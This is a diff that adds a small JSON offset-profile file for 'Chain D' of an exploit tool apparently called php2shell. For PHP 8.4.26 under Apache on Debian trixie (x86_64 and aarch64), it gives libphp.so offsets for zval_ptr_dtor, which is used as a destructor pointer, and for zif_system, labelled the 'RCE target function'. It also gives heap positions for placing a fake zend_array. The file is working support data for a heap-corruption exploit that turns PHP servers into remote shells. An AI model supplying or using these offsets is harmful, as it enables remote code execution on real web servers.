@@ -1,0 +1,23 @@
+{
+  "_comment": "Chain D offset profiles for php2shell. Keys: <php_version>-<sapi>-<distro>-<arch>",
+  "_symbols": {
+    "zval_ptr_dtor": "offset of zval_ptr_dtor in libphp.so — used as pDestructor",
+    "zif_system": "offset of zif_system in libphp.so — RCE target function",
+    "fake_array_S": "offset inside main heap chunk for fake zend_array placement",
+    "hsv": "heap slot vector offset inside main heap chunk"
+  },
+  "profiles": {
+    "8.4.26-apache-trixie-x86_64": {
+      "zval_ptr_dtor": "0x34FA10",
+      "zif_system": "0x388600",
+      "fake_array_S": "0xF8398",
+      "hsv": "0x7D720"
+    },
+    "8.4.26-apache-trixie-aarch64": {
+      "zval_ptr_dtor": "0x2D2270",
+      "zif_system": "0x2FC138",
+      "fake_array_S": "0xF8398",
+      "hsv": "0x7D720"
+    }
+  }
+}
